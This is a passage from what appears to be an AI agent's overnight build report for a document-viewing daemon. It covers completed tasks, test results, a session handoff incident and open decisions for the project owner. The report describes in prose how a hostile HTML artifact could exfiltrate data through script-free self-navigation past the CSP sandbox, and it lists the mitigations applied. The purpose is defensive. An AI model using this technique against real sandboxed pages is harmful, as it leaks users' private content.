  `<a target=_self>` click, or a **script-free** `<meta http-equiv="refresh">`). The HTML sandbox model
  always permits self-navigation; CSP has no shipped `navigate-to` directive. So a hostile/compromised
  class-F artifact could exfiltrate the manuscript (special-category data) — a real hole in A3's stated
  "doc JS is untrusted, zero external calls" invariant that CANNOT be fully closed with the current
  mechanism. **P4.1 applied the achievable mitigations** (strip `<meta http-equiv=refresh>` at serve →
  closes the no-script variant; parent-side post-handshake navigation-detect → teardown + surface a
  "document attempted to navigate" error, stopping sustained exfil + signalling). **Decision needed from
  Dawid:** either (a) formally accept this as a documented residual risk and narrow A3's wording to what
  "no egress" actually promises, OR (b) clarify the real threat model — in glosa's actual use, class-F
  artifacts are the user's OWN jethro/format-sermon LOCAL output, NOT adversary-supplied HTML, so
  self-navigation exfil of one's own content isn't a live threat (the browser-based-attacker threat A3
  targets IS fully handled by the origin-split + CSP + capability). Recommend (b) + a one-line A3 note.

## SUMMARY

**Every buildable BUILD-PLAN.md task is done.** All of Phases 1–6 (P1.1 through P6.1, 20 tasks
including P4.5-superseded-by-P6.1) are ✅ — built, adversarially reviewed where marked CC:yes, tested
with real fault/edge cases (not happy-path theater), and committed straight to `main`. P5.3 (format-
sermon companion diffs) and P5.4 (the manual rehearsal) remain ⛔ exactly as pre-marked — both need
Dawid's own eyes/session and were correctly never attempted unattended.

**What's built:** the full daemon (singleton lifecycle, journal-as-truth file bus, shadow-git
provenance, session/workspace registry, guarded lifecycle state machine, the complete HTTP API, SSE
streaming, class-R/class-F viewers with 3 edit modes, the anchoring resolver, diff/history/restore),
both agent-provider integrations (Claude Code channels+asyncRewake, Codex gate+mcp-pull), the generic
adapter-registration protocol (proven only against a neutral fixture, zero jethro code in this repo),
the full CLI command surface, and the T8 deterministic release-gate suite itself (`test/acceptance/
T8-GATE.md`).

**Test status:** 1038 pass / 0 fail, `bun run typecheck` clean, confirmed repeatedly through the
night. One known flake class recurs under system load (a subprocess-timing daemon-lock test,
`bootDaemon — ... stale lock ...`) — always clears on retry, never a real regression; not a second
one has surfaced beyond the two already-logged flake signatures.

**Coordination note:** this build spanned at least two sessions with a genuine handoff-overlap
incident (see the P6.1 entry's handoff note) — a prior session's `/goal` Stop-hook kept it alive
briefly after spawning its successor, risking two orchestrators on one repo. It was caught by the
outgoing session itself before any file corruption occurred, resolved via `/goal clear`, and logged
here for the record. No work was lost or duplicated.

**Every CC:yes task got a genuine adversarial pass** (2-3 independent reviewers: critic + a domain
specialist — security-auditor and/or concurrency-expert depending on the task), and those passes
found REAL bugs across the night: provenance-forgery and false-attribution bugs (P2.3), a lifecycle
guard blocker that would have hung `--wait` forever (P2.5), route-enumeration and dev-overlay
info-leak holes (P1.3/P3.1), an unhandled-adapter-throw DoS path and a too-strict manifest gate that
would have silently broken the real chunk-manifest feature (P6.1, caught and corrected before
landing), a `reconcileOnce` failure-poisoning bug and an honest-transition gap (P5.1), and two
test-rigor gaps in the release gate's own new suites (P5.2) — a strong argument, if one were needed,
for treating "green CI" and "adversarially reviewed" as different bars.

**Left for Dawid (2 items, both logged in "Blocked — needs Dawid" above):**
1. **Class-F self-navigation egress residual** (P4.1) — a platform-level HTML sandbox limit CSP
   can't fully close; recommend accepting as a documented residual given class-F content is the
   user's own jethro output, not adversary-supplied.
2. **Token rotate/revoke spec conflict** (P5.2) — A3 requires it, A6's command table omits it,
   nothing implements it; recommend implementing as a fast v1.x follow-up rather than blocking v1,
   but this is Dawid's call.

**Recommended next steps:** (a) rule on the two items above; (b) run P5.4's manual rehearsal against
a copy of `po-co-to-wszystko` per requirements.md's T8 spec — this is the actual "is v1 done" gate,
not tonight's green test suite; (c) review P5.3's format-sermon companion-diff proposal (not yet
drafted — flag if you want it prepared before the rehearsal); (d) file the jethro-repo handoff issue
described in the P6.1 entry's "HANDOFF — jethro-side content adapter" section.
